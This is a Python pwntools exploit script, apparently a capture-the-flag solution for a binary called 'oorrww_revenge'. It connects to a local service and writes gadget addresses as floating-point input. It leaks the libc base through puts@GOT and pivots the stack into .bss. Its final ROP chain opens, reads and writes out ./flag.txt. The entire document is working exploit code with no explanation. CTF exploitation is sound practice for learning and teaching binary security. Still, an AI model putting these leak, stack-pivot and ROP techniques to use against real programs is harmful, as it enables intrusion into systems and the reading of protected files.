#!/usr/bin/python3

import struct
from pwn import *

def int_to_float_str(num):
    return (str(struct.unpack("<d", p64(num))).encode("ascii"))[1:-2]

r = remote("localhost", 9998)
e = ELF("./oorrww_revenge")
libc = ELF("./libc.so.6")


# libc leak
pop_rax = 0x401203
ret = 0x40101a
puts_got = e.got["puts"]
gifts_mov_rdi_rax = 0x4012da
main = e.symbols["main"]

payload=[]
payload.append(pop_rax)
payload.append(puts_got)
payload.append(gifts_mov_rdi_rax)
payload.append(0) # gifts 함수에 Epilogue 중 rbp에 저장되는 값
payload.append(ret) # stack alignment
payload.append(main)

for _ in range(21):
    r.sendlineafter(b"input:\n", b".")
    
for i in range(6):
    r.sendlineafter(b"input:\n",int_to_float_str(payload[i]))
    
for _ in range(3):
    r.sendlineafter(b"input:\n", b'.')
    
libc_base = u64(r.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols["puts"]

print("libc_base : ", hex(libc_base))


# call read function

bss = e.bss()+0x100
# bss = 0x404800
read = libc_base + libc.symbols['read']
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x904a9
leave_ret = 0x4012c9

payload = []
payload.append(pop_rdi)
payload.append(0)
payload.append(pop_rsi)
payload.append(bss)
payload.append(pop_rdx_rbx)
payload.append(0x100)
payload.append(0)
payload.append(read)
payload.append(leave_ret)

for _ in range(20):
    r.sendlineafter(b"input:\n", b".")

r.sendlineafter(b"input:\n", int_to_float_str(bss-0x8)) # overwrite rbp

for i in range(9):
    r.sendlineafter(b"input:\n", int_to_float_str(payload[i]))

payload = p64(pop_rdi)
payload += p64(bss+0x80)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(libc_base+libc.symbols['open'])
payload += p64(pop_rdi)
payload += p64(3) #fd
payload += p64(pop_rsi)
payload += p64(bss+0x100)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(libc_base+libc.symbols['read'])
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(libc_base+libc.symbols['write'])
payload += b"./flag.txt\x00"

r.send(payload)

r.interactive()